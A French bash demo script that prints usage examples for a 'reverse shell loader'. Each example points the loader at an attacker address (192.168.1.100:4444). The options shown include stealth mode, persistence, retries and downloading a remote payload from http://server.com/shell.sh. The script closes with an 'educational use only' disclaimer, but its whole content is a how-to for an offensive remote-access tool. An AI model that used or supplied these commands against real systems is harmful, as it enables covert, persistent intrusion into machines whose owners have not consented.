#!/bin/bash
# Script de démonstration du loadeur
# Usage: ./demo_loader.sh

echo "🎯 DÉMONSTRATION DU LOADEUR REVERSE SHELL"
echo "==========================================="
echo

echo "📋 Commandes disponibles :"
echo
echo "1. Test basique :"
echo "   ./loader_bash.sh -t 192.168.1.100:4444"
echo

echo "2. Avec retry personnalisé :"
echo "   ./loader_bash.sh -t 192.168.1.100:4444 -r 5 -d 10"
echo

echo "3. Mode furtif :"
echo "   ./loader_bash.sh --stealth -t 192.168.1.100:4444"
echo

echo "4. Avec persistance :"
echo "   ./loader_bash.sh --persistence -t 192.168.1.100:4444"
echo

echo "5. Téléchargement à distance :"
echo "   ./loader_bash.sh -u http://server.com/shell.sh -t 192.168.1.100:4444"
echo

echo "6. Combinaison complète :"
echo "   ./loader_bash.sh --stealth --persistence -u http://server.com/shell.sh -t 192.168.1.100:4444 -r 3"
echo

echo "🔧 Fichiers créés :"
ls -la *.sh

echo
echo "⚠️  RAPPEL : Usage éducatif uniquement dans environnement autorisé !"